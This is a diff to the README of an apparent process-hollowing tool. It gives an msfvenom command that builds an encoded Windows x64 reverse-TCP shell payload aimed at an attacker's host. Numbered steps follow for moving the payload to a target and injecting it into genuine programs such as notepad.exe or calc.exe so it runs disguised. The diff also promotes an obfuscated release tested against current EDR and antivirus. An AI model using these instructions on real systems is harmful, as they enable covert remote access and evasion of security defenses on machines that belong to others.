@@ -80,18 +80,19 @@ We suggest to use directly compiled executables as in some situations it depends
 
 ### Example - msfvenom -p windows/x64/shell_reverse_tcp LHOST=< IP > LPORT=< PORT > -f raw -i < iterations as you want for evasion > -e < encoder you want to use > -o shell.bin - **x64-Bit**
   
- **2. Obfuscation is mainly your work to do as per your operation's requirement and the other one's? - WE'LL HANDLE!!!**
+ **2. Obfuscation is mainly depends your work to do as per your operation's requirement and the other things? - WE'LL HANDLE!!!**
   
   ***3. Transfer Both Payload and Binary to Target System.***
+  ***4. Hollow64.exe < Path to Any application to run or show as example -notepad.exe, calc.exe > < Path to Shellcode file > .*** - You can refer to above demonstration images to understand also .  
   
-  *4. Execute, But remember .bin files can evade better as per my Personal Experience so, just make your Payload Obfuscated for better Defense Evasion.*
+  *5. Execute, But remember .bin files can evade better as per my Personal Experience so, just make your Payload Obfuscated for better Defense Evasion.*
   
-  **5. After Execution, Payload will be run as your specified genuine windows executable ( system32's too ).**
+  **6. After Execution, Payload will be run as your specified genuine windows executable ( system32's too ).**
   
-  ***6. If you're injecting to custom binary - It might fails due to Memory allocation issue , still depends on your Privilege and many 3rd
+  ***7. If you're injecting to custom binary - It might fails due to Memory allocation issue , still depends on your Privilege and many 3rd
 level factors. But you can give it a try - In some cases it will work !! :nazar_amulet:***
 
-***7. As we know EDR's and AV signatures keep updating, so we created an obfuscated release to assist you and have tested on the Latest Updated Windows . !!!***
+***8. As we know EDR's and AV signatures keep updating, so we created an obfuscated release to assist you and have tested on the Latest Updated Windows . !!!***
 
  > [!IMPORTANT]
  > ## ⚠️**Keep few things in mind when using obfuscated release -**  
